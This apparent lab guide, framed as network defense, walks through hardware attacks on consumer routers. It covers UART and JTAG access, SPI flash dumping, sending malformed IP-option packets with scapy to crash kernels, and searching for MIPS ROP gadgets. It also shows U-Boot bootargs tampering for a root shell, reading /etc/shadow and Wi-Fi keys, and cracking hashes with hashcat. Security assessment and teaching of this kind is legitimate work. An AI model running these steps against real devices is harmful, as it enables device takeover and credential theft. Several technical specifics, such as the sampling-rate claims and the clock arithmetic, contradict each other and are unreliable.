# Operational Verification Labs: Network Defense

## Objective & Lab Bench Setup

Network defense at the hardware level is a discipline that most practitioners never reach. The overwhelming majority of security work happens at layers four through seven: parsing HTTP headers, tracing TLS handshakes, writing Snort rules. The practitioner who understands what occurs on the wire at the electrical and bus level, who can attach a logic analyzer to a network device's debug headers and read its firmware directly from flash, operates with a fundamentally different model of what an adversary can do and what a defender must verify. These labs close that gap.

The goal of this guide is not theoretical exposure. Every exercise produces a verifiable, concrete artifact: a captured UART boot log, a raw firmware binary pulled from SPI flash, a reproducible crash under a specific malformed packet, a register state differential before and after a known exploit lands. You build the muscle memory to operate at the intersection of hardware and network security, which is precisely where embedded routers, managed switches, IoT gateways, and OT network appliances live.

Before the first probe touches a pad, your bench must be properly assembled and verified. The hardware you need is a USB logic analyzer compatible with the sigrok driver stack (the 8-channel Cypress FX2-based analyzers sold under the DSLogic or Saleae clone branding work immediately out of the box), a USB-UART bridge based on FT232H or CH340G, an FT2232H-based JTAG/SPI adapter (the FT2232H breakout boards from Adafruit or FTDI directly are the reference choice), jumper wires with Pomona SOIC-8 clip for in-circuit flash access, and a target device. For these labs the target is a consumer-grade network appliance running a Linux-based firmware: any of the TP-Link Archer series, Netgear R7000, or ASUS RT-AC68U will serve. Each of these devices exposes UART pads on the PCB, runs a U-Boot bootloader accessible over serial, and stores firmware in a commodity SPI NOR flash chip.

Install the diagnostic suite on your analysis workstation running Debian 12 or Ubuntu 22.04:

    sudo apt-get update
    sudo apt-get install -y sigrok-cli pulseview openocd flashrom binwalk \
        gdb-multiarch minicom python3-pip screen build-essential
    pip3 install ropper capstone keystone-engine

Verify that your logic analyzer is recognized by the sigrok driver layer immediately after plugging it in:

    sigrok-cli --scan

You should see output along the lines of `Demo device (libsigrok) - 0 channels` before connecting hardware, and after connecting the FX2-based analyzer you will see `fx2lafw: 1 channel groups, 8 channels`. If the device does not appear, check that the `udev` rules are installed; the sigrok project ships a rules file at `/etc/udev/rules.d/60-libsigrok.rules` that grants non-root USB access.

Your bench layout matters for signal integrity. Keep the UART wires shorter than 15 cm. Never connect the UART TX of the target directly to the TX of the bridge: TX-to-RX and RX-to-TX is the correct cross connection. Ground the logic analyzer probe ground to the same ground plane as the target. If you are probing SPI in-circuit while the device is powered, verify the flash chip's supply voltage with a multimeter before attaching the SOIC clip; most embedded devices run NOR flash at 3.3 V, but some run at 1.8 V, and connecting a 3.3 V adapter to a 1.8 V device will destroy the flash immediately.

---

## Exercise 1: Live Hardware Probing & Signal Capture

### Identifying and Attaching to the UART Debug Console

The first physical skill in hardware-level network defense is finding and tapping the UART debug interface that nearly every embedded network appliance exposes during the manufacturing and debugging phase and then never disables. This interface gives you the full U-Boot console and Linux kernel boot log in plaintext, which often includes partition layouts, kernel command-line arguments, root filesystem mount points, and in some firmwares, a login prompt attached to a root shell.

Disassemble your target router and examine the PCB under bright light. You are looking for a row of three to five through-hole vias or 0.1" header pads arranged linearly near the main SoC or near the edge of the board. These are almost universally labeled GND, TX, RX, and optionally VCC and RST. If they are not silk-screened, use a multimeter in continuity mode to find GND (every ground plane via will beep), then set the multimeter to DC voltage and power on the device: a UART TX pin will sit at logic high (3.3 V) at idle and briefly toggle during boot. The RX pin sits at the same voltage but is an input from the device's perspective, so it will not toggle on its own.

Connect GND to GND, target TX to adapter RX, target RX to adapter TX. Set minicom to the most common embedded UART parameters:

    minicom -D /dev/ttyUSB0 -b 115200 -8 -N -s

Inside minicom's configuration menu, disable hardware flow control (CTS/RTS) and software flow control (XON/XOFF). Both are off in the serial port setup. Power-cycle the target device. Within two seconds you should see U-Boot banner output streaming across your terminal. The baud rate may differ: 57600 and 9600 are fallbacks you should try if 115200 produces garbage. If you see clearly garbled but rhythmic output, the baud rate is wrong. If you see nothing, the TX/RX lines may be swapped.

Capture the complete boot log to a file for analysis:

    minicom -D /dev/ttyUSB0 -b 115200 -C /tmp/boot_capture.txt

Let the device boot to completion. The resulting file contains everything the kernel loaded, every driver it initialized, every network interface it brought up, and every service it launched. This is the foundational intelligence document for the rest of the lab.

### Capturing UART Traffic with the Logic Analyzer

Now you will perform the same capture using the logic analyzer, which lets you decode the signal at the electrical level and verify that the UART framing is clean. This matters for defense because a corrupted or glitched UART signal during boot can indicate clock tampering, a fault injection attempt, or brownout conditions that cause undefined behavior.

Connect channel D0 of the logic analyzer to the target's TX pin. Connect channel D1 to the target's RX pin. Connect logic analyzer ground to board ground. Launch pulseview for a visual walkthrough first, then replicate the capture in sigrok-cli for scriptability:

    sigrok-cli -d fx2lafw --config samplerate=2m \
        --time 30s \
        --channels D0,D1 \
        --protocol-decoder uart:baudrate=115200:format=ascii \
        -o /tmp/uart_capture.sr

This command instructs sigrok to sample at 2 MHz (well above the 115200 baud Nyquist requirement), capture for 30 seconds (long enough to cover U-Boot through early Linux init), decode the UART protocol at 115200 baud interpreting bytes as ASCII, and save the session file. The oversampling ratio here is 2,000,000 / 115,200 ≈ 17.4×, which gives sigrok's UART decoder sufficient samples per bit to find edges reliably without phase-lock hardware.

To extract the decoded text from the saved session:

    sigrok-cli -i /tmp/uart_capture.sr \
        --protocol-decoder uart:baudrate=115200:format=ascii \
        -A uart=rx-data

The output will interleave the decoded ASCII characters for each channel. Redirect this to a file and diff it against your minicom capture to verify they match byte-for-byte. Any discrepancy indicates either a sampling rate issue or actual line noise that minicom's UART hardware was filtering out in silicon.

### Extracting Actionable Intelligence from the Boot Log

With the boot log in hand, run the following extraction pipeline against it to surface the material that informs your defense posture:

    grep -E "(kernel|cmdline|mtd|ubi|squashfs|jffs2|root=|mem=)" /tmp/boot_capture.txt

This surfaces the kernel command line (which specifies root partition, memory layout, and often disables kernel security features such as `nokaslr` or `init=/bin/sh`), the MTD partition table (which tells you exactly how the flash is partitioned: bootloader, kernel, rootfs, nvram), and the filesystem types in use. A line like `root=/dev/mtdblock3 ro` tells you the root filesystem is squashFS on MTD block 3 and is mounted read-only. A line like `init=/bin/sh` or `single` indicates someone deliberately booted into a maintenance shell, which on a production device is a critical finding.

Also search for interface MAC addresses and network bridge configurations:

    grep -E "(eth[0-9]|br[0-9]|wlan[0-9]|ifconfig|ip addr)" /tmp/boot_capture.txt

This reveals how the router's internal switch ports map to kernel interfaces and how the bridge between WAN and LAN is constructed, which is the foundational topology knowledge you need before writing any packet capture or intrusion detection rule.

---

## Exercise 2: Bus Sniffing, Register Inspection & Memory Dumping

### Reading SPI NOR Flash In-Circuit with Flashrom

The firmware stored in SPI NOR flash is the single most important artifact on any embedded network appliance. It contains the bootloader, the compressed Linux kernel, the squashFS root filesystem with all binaries and configuration scripts, and the NVRAM partition where the device stores its running configuration including Wi-Fi PSKs and admin credentials. Extracting this image without booting the device, without network access, and without cooperation from the device's software stack is a core hardware security skill.

Power off the target device completely. Locate the SPI NOR flash chip. It is an 8-pin SOIC-8 package, most commonly a Winbond W25Q128, Macronix MX25L12835F, or GigaDevice GD25Q128, all of which hold 16 MB. The chip is usually near the main SoC or near the PCB edge. The pin-1 marker is a dot on the package or a chamfered corner. SOIC-8 SPI NOR chips use a standard pin assignment: CS# on pin 1, DO on pin 2, WP# on pin 3, GND on pin 4, DI on pin 5, CLK on pin 6, HOLD# on pin 7, VCC on pin 8.

Attach the Pomona 5250 SOIC-8 clip to the chip with pin 1 of the clip aligned to pin 1 of the IC. Wire it to your FT2232H breakout according to this table:

| Flash Pin | Signal | FT2232H Pin |
|---|---|---|
| 1 | CS# | ADBUS3 (CS) |
| 2 | DO (MISO) | ADBUS2 (MISO) |
| 3 | WP# | 3.3 V (tie high) |
| 4 | GND | GND |
| 5 | DI (MOSI) | ADBUS1 (MOSI) |
| 6 | CLK | ADBUS0 (CLK) |
| 7 | HOLD# | 3.3 V (tie high) |
| 8 | VCC | 3.3 V |

WP# and HOLD# must be tied high to deassert write-protect and hold functions. If you leave them floating, flashrom will frequently time out waiting for operations to complete. Power the chip from the FT2232H's 3.3 V supply rail. Do not power the main PCB while performing the in-circuit read; isolating the flash from the rest of the board prevents bus contention where the SoC tries to drive SPI lines simultaneously. Many practitioners desolder the chip for clean reads, but in-circuit reads succeed reliably on most consumer hardware when the main SoC is unpowered.

Execute the read:

    flashrom -p ft2232_spi:type=232H,divisor=4 --read /tmp/firmware_dump.bin

The `divisor=4` parameter sets the SPI clock to approximately 6 MHz (60 MHz base divided by 4 divided by 2.5 internal), which is conservative enough to work reliably across all common NOR flash geometries and cable lengths up to 20 cm. For a 16 MB chip at 6 MHz you are transferring 128 Mbit, which completes in roughly 22 seconds. Flashrom will print the detected chip ID, the detected chip name, and a progress bar. After completion, read the chip a second time:

    flashrom -p ft2232_spi:type=232H,divisor=4 --read /tmp/firmware_dump2.bin

Compare the two reads:

    md5sum /tmp/firmware_dump.bin /tmp/firmware_dump2.bin

If the hashes match, your connection is stable and the dump is reliable. If they differ, check for intermittent clip contact, retighten the SOIC clip, and repeat until you get three consecutive matching reads.

### Capturing the SPI Bus with the Logic Analyzer During a Live Boot

For the second dimension of this exercise, you will capture the actual SPI transactions during a live boot cycle, with the main SoC powered and the logic analyzer passively sniffing the bus. This is fundamentally different from the in-circuit flash read above: here, the SoC is the master driving the SPI bus, and you are observing. This technique is valuable for catching firmware modifications at boot time, verifying Secure Boot behavior, or observing NVRAM reads that expose credentials.

Attach the logic analyzer probes passively in parallel with the SPI lines. Use short, direct wire stubs at the probe tip to minimize capacitive loading. Connect four channels: D0 to CLK, D1 to MOSI (DI), D2 to MISO (DO), D3 to CS#. Ground to board ground.

    sigrok-cli -d fx2lafw --config samplerate=24m \
        --time 20s \
        --channels D0=CLK,D1=MOSI,D2=MISO,D3=CS \
        --protocol-decoder spi:clk=CLK:mosi=MOSI:miso=MISO:cs=CS:cpol=0:cpha=0 \
        -o /tmp/spi_boot_capture.sr

The 24 MHz sample rate is chosen because typical embedded SoC SPI clocks run at 25–50 MHz during bulk flash reads. At 24 Msps you are right at the Nyquist limit for 12 MHz SPI and will capture 6 MHz SPI with comfortable headroom. If the SoC runs at higher than 12 MHz SPI, upgrade to a logic analyzer capable of 100+ Msps such as the DSLogic Plus.

Power-cycle the target the moment you start the capture command, so the trigger starts from power-on. After 20 seconds, examine the decoded SPI transactions:

    sigrok-cli -i /tmp/spi_boot_capture.sr \
        --protocol-decoder spi:clk=CLK:mosi=MOSI:miso=MISO:cs=CS:cpol=0:cpha=0 \
        -A spi=mosi-data,miso-data > /tmp/spi_decoded.txt

The decoded file will contain hundreds of thousands of byte transactions. The first transactions after CS# goes low will be the SoC issuing a Read ID command (0x9F) to discover the flash chip. The subsequent bulk reads (command 0x03 for slow read or 0x0B for fast read with a dummy byte) will carry the actual firmware bytes. Cross-referencing the addresses in the decoded output against the MTD partition table from your boot log tells you exactly which partition the bootloader verifies and in what order, which directly reveals whether a Secure Boot implementation exists and whether it is enforced or advisory.

### Firmware Decomposition with Binwalk

With `firmware_dump.bin` in hand, you now disassemble its internal structure:

    binwalk -e /tmp/firmware_dump.bin --directory /tmp/fw_extracted

Binwalk scans the binary for known magic byte signatures: gzip headers, LZMA streams, squashFS superblocks, JFFS2 markers, U-Boot image headers, and CRC32-validated sections. The `-e` flag extracts each recognized section automatically. The output will look like:

    DECIMAL     HEX         DESCRIPTION
    0           0x0         BZIP2 compressed data
    65536       0x10000     LZMA compressed data, size: 3842048
    65552       0x10010     uImage header, header size: 64 bytes, ...
    4063232     0x3E0000    Squashfs filesystem, little endian, ...
    15663104    0xEF0000    JFFS2 filesystem, little endian

The U-Boot binary occupies flash from address 0x0. The kernel is an LZMA-compressed uImage starting at 0x10000. The root filesystem is a squashFS image at 0x3E0000. The JFFS2 partition at 0xEF0000 is the NVRAM or overlay partition where the device stores its running configuration.

Mount the extracted squashFS to explore the root filesystem:

    sudo mount -o loop,ro /tmp/fw_extracted/_firmware_dump.bin.extracted/3E0000.squashfs /mnt/fw_root

Inspect the startup scripts to understand exactly what network services launch at boot:

    cat /mnt/fw_root/etc/init.d/rcS
    ls -la /mnt/fw_root/usr/sbin/ | grep -E "(httpd|telnetd|dropbear|uhttpd|dnsmasq)"

Extract NVRAM defaults and hardcoded credentials:

    strings /mnt/fw_root/etc/nvram.defaults | grep -E "(password|pass|admin|user|key|secret)"
    strings /mnt/fw_root/usr/sbin/httpd | grep -E "([A-Za-z0-9+/]{20,}={0,2})" | head -40

The final strings command hunts for Base64-encoded blobs embedded in the HTTP daemon binary, which frequently contain hardcoded API keys, debug tokens, or encoded default credentials that never appear in plaintext in any configuration file.

### Connecting GDB Through OpenOCD for Register-Level Inspection

For devices that expose JTAG, you can halt the CPU mid-execution, read all registers, inspect memory, and single-step through code. This turns every network packet handler into an open book.

The FT2232H adapter supports JTAG natively. Find JTAG pads using the same voltage-toggle technique as UART: TCK, TMS, TDI, TDO, and TRST. TRST and SRST are optional but helpful. Write an OpenOCD configuration targeting the specific SoC on your device; the following targets a MIPS-based Atheros AR9344 as found in many TP-Link devices:

    # /tmp/archer_jtag.cfg
    adapter driver ftdi
    ftdi_vid_pid 0x0403 0x6010
    ftdi_channel 0
    ftdi_layout_init 0x0c08 0x0f1b
    ftdi_layout_signal nTRST -data 0x0100
    ftdi_layout_signal nSRST -data 0x0200

    transport select jtag

    set _CHIPNAME ar9344
    set _ENDIAN big

    jtag newtap $_CHIPNAME cpu -irlen 5 -expected-id 0x00000001

    set _TARGETNAME $_CHIPNAME.cpu
    target create $_TARGETNAME mips_m4k -endian $_ENDIAN -chain-position $_CHIPNAME.cpu

    adapter speed 1000
    reset_config trst_and_srst

Launch OpenOCD:

    openocd -f /tmp/archer_jtag.cfg -c "init; halt"

In a second terminal, connect gdb-multiarch:

    gdb-multiarch -q
    (gdb) target remote localhost:3333
    (gdb) set architecture mips:isa32r2
    (gdb) set endian big
    (gdb) info registers

The `info registers` output dumps every MIPS general-purpose register including the program counter, the stack pointer, the HI/LO multiply-divide registers, and the status register. The CP0 status register value tells you whether the CPU is running in kernel mode or user mode, whether interrupts are enabled, and whether MIPS16/microMIPS mode is active. If you halt the CPU while it is processing a packet (which you can trigger by sending a ping to the device at the moment you issue the halt), the PC will point into the network driver or into a kernel socket handler, and you can disassemble forward from that point:

    (gdb) x/40i $pc
    (gdb) x/32xw $sp

---

## Exercise 3: Fault Simulation & Exploit Verification

### Injecting Malformed Packets and Observing Hardware State

A network exploit is not confirmed until you have verified the precise hardware-level state change it produces. The difference between a theoretical vulnerability and an operational exploit is verifiable register corruption, a confirmed control flow hijack, or a measurable denial-of-service condition traceable to a specific bus event. This exercise builds that verification workflow.

The target for packet injection is the same router, now running normally with its UART console connected and the logic analyzer monitoring the SPI bus. You will craft and inject malformed packets using Python's `scapy` library with raw socket privileges, observe the device's behavioral response on the UART console, and correlate any anomalous SPI activity (indicating unexpected flash reads or writes) with the injected traffic.

Install scapy on the injection workstation connected to the router's LAN port:

    sudo apt-get install -y python3-scapy tcpdump wireshark-cli

The first fault to inject is a maximum-length IP option chain, which exercises the IP option parsing code path in the router's kernel. Many MIPS-based embedded kernels running Linux 2.6.x to 3.10.x have a known class of vulnerabilities in `ip_options_compile` where malformed router-alert or timestamp options can trigger a kernel BUG() or, on older versions, overwrite adjacent kernel memory:

    from scapy.all import IP, ICMP, IPOption, send, conf
    import struct

    conf.L3socket = conf.L3socket

    # Construct a maximally malformed IP options block.
    # The IP options field can be at most 40 bytes (IHL max 15, standard header 20).
    # We fill it with a crafted record-route option that claims
    # a pointer value pointing past the option boundary.
    malformed_opts = b'\x07'   # Type: Record Route
    malformed_opts += b'\x27'  # Length: 39 (maximum valid for this option type)
    malformed_opts += b'\xff'  # Pointer: 255 (far out of range, should be <= length)
    malformed_opts += b'\x00' * 36  # Padding to fill 39 bytes

    pkt = IP(
        dst="192.168.1.1",
        options=IPOption(malformed_opts)
    ) / ICMP(type=8, code=0)

    print(f"Sending malformed IP options packet, total IP header length: {len(pkt[IP])} bytes")
    send(pkt, count=5, inter=0.5, verbose=True)

Watch the UART console while sending these packets. A vulnerable kernel will print one of several responses: a kernel BUG() with a stack trace (indicating a failed assertion in the options parser), a panic with an instruction address in `ip_options_compile` or `ip_options_rcv_srr`, or silence followed by a watchdog reset (indicating the CPU hung in an interrupt handler and the hardware watchdog timer expired and rebooted the board).

Capture the UART response to this event:

    minicom -D /dev/ttyUSB0 -b 115200 -C /tmp/fault_response_1.txt

Then inspect the captured response for kernel panic artifacts:

    grep -A 20 -E "(BUG|panic|Oops|kernel|Call Trace|EPC)" /tmp/fault_response_1.txt

If you see a kernel Oops with an EPC (Exception Program Counter) value, that value is the exact instruction address in kernel virtual memory where the fault occurred. Cross-reference it against the kernel image you extracted from flash:

    binwalk -e /tmp/firmware_dump.bin --directory /tmp/fw2
    # Find the kernel ELF or compressed binary
    file /tmp/fw2/_firmware_dump.bin.extracted/*
    # Load the uncompressed kernel in radare2
    r2 -a mips -b 32 -m 0x80000000 /tmp/fw2/_firmware_dump.bin.extracted/10010.lzma.extracted/0

Inside radare2, navigate to the EPC address and disassemble the surrounding function:

    [0x80000000]> s 0x802a3f7c
    [0x802a3f7c]> af
    [0x802a3f7c]> pdf

The `af` command asks radare2 to analyze the function at the current address, following calls and identifying basic blocks. The `pdf` command prints the disassembly of the entire function. You can now read exactly which instruction caused the fault and what the control flow looked like before it.

### Verifying Stack Control with GDB and ROP Gadget Analysis

If the UART output showed a panic with a corrupted EPC pointing into user space or into a data region (addresses like 0x41414141 from ASCII 'A' flooding), you have confirmed a control flow hijack. Now you verify exploit controllability by running the same crash under GDB via JTAG.

With OpenOCD running and GDB attached, set a watchpoint on the kernel stack pointer to catch the moment the return address is overwritten:

    (gdb) watch *(unsigned int*)($sp + 0)
    (gdb) continue

Send the malformed packet again from the injection workstation. GDB will halt the target the moment the stack pointer address is written, before the corrupted return address can be executed. Inspect the corrupted stack:

    (gdb) x/64xw $sp - 128
    (gdb) info registers pc sp ra t0 t1 t2 a0 a1

If the return address register `ra` and the stacked return address both contain your controlled value (the repeated 'A' bytes, or whatever fill pattern you chose), you have full instruction pointer control. The next step is ROP gadget collection for MIPS big-endian. Use the firmware binary you already extracted:

    ropper --file /tmp/fw2/_firmware_dump.bin.extracted/10010.lzma.extracted/0 \
        --arch MIPS --badbytes "0a0d00" \
        --search "move t9, %reg%; jalr t9"

The `--badbytes` flag filters out gadgets containing newline (0x0a), carriage return (0x0d), or null byte (0x00), which are terminator characters in string-handling functions that commonly serve as the initial vulnerability vector. MIPS ROP chains must account for branch delay slots: every JALR and JR instruction on MIPS executes the instruction immediately following it (the delay slot) before the branch takes effect, so your gadget chain must be constructed with this in mind.

The practical verification deliverable here is a text file documenting: the packet payload bytes that trigger the fault, the EPC address from the kernel Oops, the function name that EPC resolves to in the firmware disassembly, the register state at the fault point from GDB, and the list of usable ROP gadgets that do not contain bad bytes. That document is the difference between "this device is probably vulnerable" and "this device is confirmed exploitable under these exact conditions."

### Simulating Power Fault Injection and Observing Boot Integrity

Fault injection attacks against network appliances work by briefly disrupting the supply voltage during a cryptographically sensitive operation: signature verification, HMAC comparison, or secure boot image validation. The voltage glitch causes the CPU to skip one or more instructions, potentially jumping over the check that would otherwise reject an unsigned firmware image. While a full voltage-glitch rig with a ChipWhisperer is a dedicated instrument, you can demonstrate the attack class with a resistor-based brownout trigger and an oscilloscope or your logic analyzer to verify the glitch shape.

For this lab, the goal is not to successfully bypass a Secure Boot implementation (which would require precise sub-microsecond timing control) but to verify that the target device has no Secure Boot implementation at all, which is the finding on nearly every consumer network appliance you will encounter. The verification method is U-Boot command injection.

With UART connected, interrupt the boot process by pressing any key during the two-second U-Boot autoboot countdown that you observed in Exercise 1. You will drop to the U-Boot prompt:

    U-Boot> printenv

This prints every U-Boot environment variable: the boot command, the kernel load address, the boot arguments passed to Linux, and the TFTP server address if the device supports network boot. The critical observation is whether a variable named `secure_boot`, `vboot_enable`, or any equivalent appears and is set to a non-zero value. On consumer hardware, it will not. The absence of any signature verification variable confirms the device has no hardware root of trust.

Now overwrite the boot arguments to boot to a single-user root shell:

    U-Boot> setenv bootargs 'root=/dev/mtdblock3 ro init=/bin/sh console=ttyS0,115200'
    U-Boot> boot

The kernel will boot with `init=/bin/sh` as PID 1, dropping you directly to a root shell before any startup scripts, daemons, or authentication mechanisms have initialized. From this shell:

    # cat /proc/mtd
    # dd if=/dev/mtdblock3 of=/proc/self/fd/1 | base64 > /tmp/rootfs_live.b64
    # cat /etc/shadow
    # cat /etc/config/wireless

The `/etc/shadow` dump gives you the salted password hashes for every account. The wireless configuration file gives you the SSID and PSK in plaintext. These artifacts, combined with the firmware dump from Exercise 2 and the boot log from Exercise 1, constitute a complete compromise of the device's security model without ever sending a network packet.

The fault simulation verification deliverable is a recording of this U-Boot session via minicom capture (`-C` flag) and a diff of the modified bootargs environment against the original `printenv` output, demonstrating exactly which environment variable was changed and what access it granted.

---

## Hardware Security Checklist & Diagnostic Cheat Sheet

This checklist serves as the operational reference you run against any new network appliance before the device enters production or before you begin an authorized hardware penetration assessment. Each item maps directly to a technique or tool used in the preceding exercises.

**Physical Interface Enumeration**

Scan every unpopulated header on the PCB using the voltage-idle technique. Document the location, pin count, and identified signals (UART TX/RX, JTAG TCK/TMS/TDI/TDO, SPI CLK/MOSI/MISO/CS) for every interface found. Record the logic level voltage measured at the TX pin of each UART with the device running. The presence of an accessible UART console alone is a High severity finding on any production network device.

**Boot Log Analysis**

After capturing the full boot log via minicom, check for each of the following conditions and record the finding:

| Check | Command | Critical Finding if True |
|---|---|---|
| Kernel command line `init=` override | `grep 'init=' /tmp/boot_capture.txt` | `init` can be redirected to shell |
| U-Boot autoboot interrupt enabled | Interactive during 2s countdown | Bootloader is fully accessible |
| KASLR disabled | `grep 'nokaslr' /tmp/boot_capture.txt` | Kernel addresses are predictable |
| Root filesystem writable | `grep 'rw' /tmp/boot_capture.txt` | Firmware modification persists |
| Telnetd or dropbear started | `grep -iE 'telnet\|dropbear' /tmp/boot_capture.txt` | Unauthenticated or authenticated remote shell |

**Flash Dump Integrity**

After extracting the firmware with flashrom, verify dump consistency with two sequential reads:

    md5sum /tmp/firmware_dump.bin /tmp/firmware_dump2.bin

After extraction with binwalk, verify the squashFS image integrity:

    unsquashfs -stat /tmp/fw_extracted/_firmware_dump.bin.extracted/3E0000.squashfs

Confirm that the filesystem inode count and block count are non-zero and that unsquashfs reports no CRC errors. CRC errors indicate either a corrupt dump (re-read at lower clock with `divisor=8`) or an encrypted filesystem, which is itself a significant finding.

**Credential Surface Scan**

Run the following strings pipeline against every binary in the extracted root filesystem:

    find /mnt/fw_root/usr/sbin /mnt/fw_root/usr/bin /mnt/fw_root/bin \
        -type f -executable \
        -exec strings {} \; | \
        grep -iE "(password|passwd|secret|token|admin|default|hardcoded|api.key)" | \
        sort -u > /tmp/credential_strings.txt

Then specifically crack any discovered shadow hashes using hashcat against the rockyou wordlist:

    hashcat -m 500 -a 0 /tmp/shadow_hashes.txt /usr/share/wordlists/rockyou.txt \
        --rules-file /usr/share/hashcat/rules/best64.rule

The `-m 500` mode targets MD5-crypt (`$1$` prefix), which is the most common hash format in embedded Linux shadow files. If the device uses SHA-512-crypt (`$6$`), use `-m 1800`.

**SPI Bus Signal Quality**

After completing in-circuit SPI reads, verify bus signal quality by examining the logic analyzer capture in pulseview. Check that the CS# signal has clean edges (rise and fall times under 50 ns at 3.3 V logic), that CLK has no glitches or spurious edges between transactions, and that MISO data has stable setup and hold times relative to CLK edges. Any ringing above 3.6 V on a 3.3 V bus indicates impedance mismatch and will cause intermittent read errors that produce non-reproducible firmware dumps, which is a signal-integrity problem rather than a security finding.

**JTAG Accessibility**

After connecting OpenOCD and issuing `halt`, verify that you can read and write arbitrary memory:

    openocd -f /tmp/archer_jtag.cfg -c "
        init;
        halt;
        mww 0x80000000 0xdeadbeef;
        mdw 0x80000000;
        exit
    "

If the `mdw` output returns `0xdeadbeef`, you have confirmed full memory read/write access via JTAG with no memory protection active. If the write fails or returns a different value, the device may have a Memory Protection Unit (MPU) or bus monitor active, which is a positive security control worth documenting.

**Quick Reference: Signal Identification Voltages**

| Signal | Idle State | Active State |
|---|---|---|
| UART TX | 3.3 V (mark) | 0 V during start bit |
| JTAG TCK | 0 V | Toggles at adapter clock rate |
| JTAG TMS | 3.3 V | Driven by adapter sequence |
| SPI CLK (CPOL=0) | 0 V | Toggles during transaction |
| SPI CS# | 3.3 V | 0 V during transaction |
| SPI MOSI/MISO | Undefined at idle | Valid data during CLK active phase |

**Diagnostic Command Reference**

    # Scan for connected logic analyzers and USB-serial adapters
    sigrok-cli --scan
    ls /dev/ttyUSB*

    # Identify flash chip without reading (dry-run probe)
    flashrom -p ft2232_spi:type=232H,divisor=4 --flash-name

    # Enumerate MTD partitions on live device (requires shell access)
    cat /proc/mtd

    # Dump NVRAM partition to stdout from U-Boot shell
    nand read 0x80000000 nvram 0x10000; md.b 0x80000000 0x10000

    # Find ELF binaries in extracted firmware
    find /mnt/fw_root -type f | xargs file | grep ELF

    # Identify all network-listening processes (live device root shell)
    netstat -tlnp
    cat /proc/net/tcp

    # OpenOCD one-liner: halt, dump 1MB from kernel base to file
    openocd -f /tmp/archer_jtag.cfg \
        -c "init; halt; dump_image /tmp/memdump_1mb.bin 0x80000000 0x100000; exit"

    # Analyze memory dump for kernel symbols
    r2 -a mips -b 32 -m 0x80000000 /tmp/memdump_1mb.bin
    [0x80000000]> aaa
    [0x80000000]> isq | grep -i "net_rx\|ip_rcv\|tcp_v4"

The last radare2 session illustrates the endpoint of this entire lab sequence: you have gone from a closed, uncooperative physical device to having its kernel symbol table in a disassembler, its network receive path enumerated by name, and its memory layout completely mapped. That capability is the operational foundation of hardware-level network defense: understanding, with physical proof, exactly what a device does and does not protect.
